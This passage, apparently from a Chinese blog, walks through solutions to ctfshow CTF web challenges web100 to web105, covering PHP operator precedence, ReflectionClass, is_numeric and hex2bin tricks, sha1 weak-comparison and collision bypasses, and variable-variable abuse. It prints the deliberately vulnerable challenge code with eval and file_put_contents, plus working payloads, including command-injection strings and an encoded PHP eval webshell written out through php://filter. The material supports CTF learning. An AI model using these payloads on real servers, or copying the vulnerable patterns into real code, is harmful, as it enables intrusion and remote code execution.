php"><table><tr><td class="code"><pre><span class="line">因为赋值运算的优先级比AND和OR的高，所以先赋值；比&amp;&amp;和||的低，所以逻辑运算符先执行，先逻辑运算，再赋值</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$v0</span>=<span class="literal">true</span> <span class="keyword">and</span> <span class="literal">false</span> <span class="keyword">and</span> <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$v0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$v0</span>=<span class="literal">true</span> &amp;&amp; <span class="literal">false</span> &amp;&amp;<span class="literal">false</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="variable">$v0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#bool(true)</span></span><br><span class="line"><span class="comment">#bool(false)</span></span><br></pre></td></tr></table></figure><p>那么这里只要$v1是数字就可以返回$v0为true</p><h2 id="反射类ReflectionClass使用"><a href="#反射类ReflectionClass使用" class="headerlink" title="反射类ReflectionClass使用"></a>反射类ReflectionClass使用</h2><p>可以直接输出这个类,也就是构造出echo new ReflectionClass(‘ctfshow’);</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404123333490.png" alt="image-20220404123333490"></p><p>反射类不仅仅可以建立对类的映射,也可以建立对php方法的映射,返回对php基本方法的映射,返回基本方法的执行情况,因此可以通过建立</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">new ReflectionClass(system(&#x27;dir&#x27;));</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404123544581.png" alt="image-20220404123544581"></p><p>对反射类的理解</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$flag</span>=<span class="string">&quot;flag&#123;123123123&#125;&quot;</span>;</span><br><span class="line"><span class="keyword">const</span>  PI=<span class="number">3.14</span>;</span><br><span class="line"><span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;A&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getConstants</span>());  获取一组常量</span><br><span class="line">输出</span><br><span class="line"> <span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;PI&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">float</span>(<span class="number">3.14</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getName</span>());    获取类名</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getStaticProperties</span>()); 获取静态属性</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;flag&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;flag&#123;123123123&#125;&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>-&gt;<span class="title function_ invoke__">getMethods</span>()); 获取类中的方法</span><br><span class="line">输出</span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">object</span>(ReflectionMethod)<span class="comment">#2 (2) &#123;</span></span><br><span class="line">    [<span class="string">&quot;name&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">5</span>) <span class="string">&quot;hello&quot;</span></span><br><span class="line">    [<span class="string">&quot;class&quot;</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;A&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非预期解</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">直接输出$ctfshow</span><br><span class="line">构造 var_dump($ctfshow);</span><br><span class="line">?v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">过滤不多可以直接执行命令</span><br><span class="line">?v1=1&amp;v2=?&gt;&lt;?php echo `ls`?&gt;/*&amp;v3=;*/</span><br><span class="line">?v1=1&amp;v2=system(&#x27;ls&#x27;)&amp;v3=-1;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_is_ab5f4bb70x2df6d60x2d47470x2dbd3a0x2de12e3c8a7416</span><br><span class="line">ctfshow&#123;ab5f4bb7-f6d6-4747-bd3a-e12e3c8a7416&#125;</span><br><span class="line">要构造一下,将0x2b转换成-哦</span><br></pre></td></tr></table></figure><h1 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-22 00:26:48</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title class_">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v1 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">17</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v2 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: v3 in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">19</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里将上一关的非预期给过滤了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404132535124.png" alt="image-20220404132535124"></p><p>还是要构造一下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag_649e19730x2d39050x2d4cb20x2d900b0x2d3b4c30b15a4</span><br><span class="line">ctfshow&#123;649e1973-3905-4cb2-900b-3b4c30b15a4&#125;要爆破最后一位哦</span><br><span class="line">ctfshow&#123;ab5f4bb7-f6d6-4747-bd3a-e12e3c8a7416&#125;#上关的少一位</span><br></pre></td></tr></table></figure><h1 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: atao</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-23 20:59:43</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);<span class="comment">#这里是从第二个开始,也就是去除前面两个字符</span></span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);<span class="comment">#调用v1函数,并传入$s</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);<span class="comment">#将str也就是v2写入v3中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func — 把第一个参数作为回调函数调用</span><br><span class="line"></span><br><span class="line">说明</span><br><span class="line">mixed call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )</span><br><span class="line">第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</span><br><span class="line"></span><br><span class="line">参数</span><br><span class="line">callback</span><br><span class="line">将被调用的回调函数（callable）。</span><br><span class="line"></span><br><span class="line">parameter</span><br><span class="line">0个或以上的参数，被传入回调函数，可以是数组。</span><br></pre></td></tr></table></figure><p>在php5的环境中,是可以识别16进制的,也就是说,如果传入v2&#x3D;0x66也是可以识别为数字的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(is_numeric(&quot;0x66&quot;));  php5的环境下返回true  php7返回false</span><br></pre></td></tr></table></figure><p>之后经过substr的截断也就剩下了66,不带0x的,这里就可以通过调用hex2bin将16进制转换成字符串从而写入木马文件.这里至于为什么要截取两个字符出去,就是因为hex2bin如果参数中带有0x会报错</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;66&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">hex2bin</span>(<span class="string">&#x27;0x66&#x27;</span>);</span><br><span class="line">PHP Warning:  <span class="title function_ invoke__">hex2bin</span>(): Input <span class="keyword">string</span> must be hexadecimal <span class="keyword">string</span> in D:\Download\PHP1.php on line <span class="number">3</span></span><br><span class="line">f</span><br><span class="line">Warning: <span class="title function_ invoke__">hex2bin</span>(): Input <span class="keyword">string</span> must be hexadecimal <span class="keyword">string</span> in D:\Download\PHP1.php on line <span class="number">3</span></span><br></pre></td></tr></table></figure><p>那么这里就很清晰了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[zf]);?&gt;  -&gt;  0x3c3f70687020406576616c28245f504f53545b7a665d293b3f3e</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=0x3c3f70687020406576616c28245f504f53545b7a665d293b3f3e&amp;v3=1.php</span><br><span class="line">POST</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><p>但是经过尝试,这里是不可以的哦</p><p>因为在php7的环境下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var_dump(is_numeric(&quot;0x3c3f706870206576616c28245f504f53545b315d293b3f3e&quot;));  </span><br><span class="line">下返回false</span><br></pre></td></tr></table></figure><p>那么我们就必须要让v2均为数字,那就要利用伪协议把内容进行编码转换找到一条语句经过base64编码后再转换为16进制全是数字的.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$a=&quot;&lt;?=`cat *`;&quot;;</span><br><span class="line">$b=base64_encode($a); // PD89YGNhdCAqYDs=</span><br><span class="line">$c=bin2hex($b); //这里直接用去掉=的base64</span><br><span class="line"></span><br><span class="line"># 5044383959474e6864434171594473</span><br><span class="line">如果$c全部都是纯数字就可以了。</span><br><span class="line">带e的话会被认为是科学计数法，可以通过is_numeric检测。</span><br><span class="line">大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">POST</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404164440314.png" alt="image-20220404164440314"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404164449225.png" alt="image-20220404164449225"></p><h1 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: atao</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-23 21:03:24</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v4</span>)&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$v2</span>,<span class="number">2</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$v1</span>,<span class="variable">$s</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/.*p.*h.*p.*/i&quot;</span>,<span class="variable">$str</span>))&#123;<span class="comment">#匹配hex2bin解码后有没有php</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$v3</span>,<span class="variable">$str</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;Sorry&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用上一关的可过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php</span><br><span class="line">POST</span><br><span class="line">v1=hex2bin</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404164923311.png" alt="image-20220404164923311"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404164932046.png" alt="image-20220404164932046"></p><h1 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: atao</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-28 22:27:20</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里并没有判断v1等不等与v2那么直接</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=a</span><br><span class="line">POST</span><br><span class="line">v1=a</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404165521198.png" alt="image-20220404165521198"></p><p>但是应该不会这么简单,那么还是利用php的sha1()函数无法处理数组绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2[]=1</span><br><span class="line">POST</span><br><span class="line">v1[]=a</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404165627265.png" alt="image-20220404165627265"></p><p>由于是弱类型比较,那么就可以通过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aaroZmOk0e66507019969427134894567494305185566735</span><br><span class="line">aaK1STfY0e76658526655756207688271159624026011393</span><br><span class="line">aaO8zKZF0e89257456677279068558073954252716165668</span><br><span class="line">aa3OFF9m0e36977786278517984959260394024281014729</span><br></pre></td></tr></table></figure><p>可见这里的全都是0e开头,那么在弱类型相等的时候0e就是0自然相等,因此也可以传</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?v2=aaroZmOk</span><br><span class="line">POST</span><br><span class="line">v1=aaK1STfY</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404173820780.png" alt="image-20220404173820780"></p><p>sha1碰撞一下</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 不需要base64时，可直接使用以下payload</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&quot;%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>))));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$b</span>))));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220404174012565.png" alt="image-20220404174012565"></p><h1 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: Firebasky</span></span><br><span class="line"><span class="comment"> Date:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">#循环$_GET数组中的元素</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;<span class="comment">#如果$key===error就结束</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;<span class="comment">#key中的所有值赋值为value</span></span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;<span class="comment">#如果post的值为flag就结束</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;<span class="comment">#如果post的flag不等于flag就结束</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你还想要flag嘛？</span><br></pre></td></tr></table></figure><p>简单分析一下,如果$error就是$flag就可以直接输出flag,那么我们需要让$error为$flag.第一种想法,就是在post中给$key赋值为error给$value复制为flag,但是这里value的值是不能是flag的,那么仔细观察就可以发现在get中的值可以是flag,但是key的值不能是error.所以我们就可以给get中的key赋值一个中间变量来进行传递一下flag.</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET</span><br><span class="line">tmp=flag -&gt; $tmp = $flag </span><br><span class="line">POST</span><br><span class="line">error=tmp -&gt; $error = $tmp = $flag -&gt; $error = $flag</span><br></pre></td></tr></table></figure><p>传入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?tmp=flag</span><br><span class="line">POST</span><br><span 